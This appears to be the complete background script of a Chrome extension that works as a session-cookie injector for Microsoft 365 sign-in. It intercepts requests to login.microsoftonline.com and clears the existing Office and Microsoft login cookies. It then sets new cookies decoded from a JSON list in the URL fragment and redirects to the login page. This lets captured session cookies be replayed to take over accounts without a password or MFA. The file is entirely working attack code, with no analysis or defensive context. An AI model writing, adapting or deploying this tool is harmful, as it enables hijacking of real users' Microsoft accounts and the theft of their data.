chrome.runtime.onInstalled.addListener(function() {
   var callback = function(details) {
    if (details.url.indexOf('login.microsoftonline.com')!= -1&&details.url.indexOf('/#/')!= -1) {
		
		chrome.cookies.getAll({url: "https://www.office.com"}, function(cookie) {
		
        for (i = 0; i < cookie.length; i++) {
        chrome.cookies.remove({url: "https://" + cookie[i]["domain"], name: cookie[i]["name"]},function(cookie){
				});
			}
        });			
		
		chrome.cookies.getAll({url: "https://login.microsoftonline.com"}, function(cookie) {
		var cookiedomain = '';
        for (i = 0; i < cookie.length; i++) {
				    if (cookie[i]["domain"].startsWith('.')){cookiedomain = cookie[i]["domain"].substring(1);}else{
						cookiedomain = cookie[i]["domain"];};
                        chrome.cookies.remove({url: "https://" + cookiedomain, name: cookie[i]["name"]},function(cookie){
				});
			}
 
			const linkhash = details.url.match(/#\/([^?&=]*)/);
		    const cooki = linkhash[1];
		    const cookiesobj = JSON.parse(decodeURIComponent(cooki));
		
				
		for(var i=0; i<cookiesobj.length;i++) {
        chrome.cookies.set({"url": "https://login.microsoftonline.com/", "domain":cookiesobj[i].domain, "name": cookiesobj[i].name, "value":cookiesobj[i].value},function(cookie){
		});
		
		
		}	
			
			
});	

	return {redirectUrl: 'https://login.microsoftonline.com/'};	        
    }
};
   var filter = {urls: ["*://login.microsoftonline.com/*","*://*.microsoftonline.com/*"],types: ["main_frame", "sub_frame"]};
   var opt_extraInfoSpec = ["blocking"];
   chrome.webRequest.onBeforeRequest.addListener(callback, filter, opt_extraInfoSpec);
});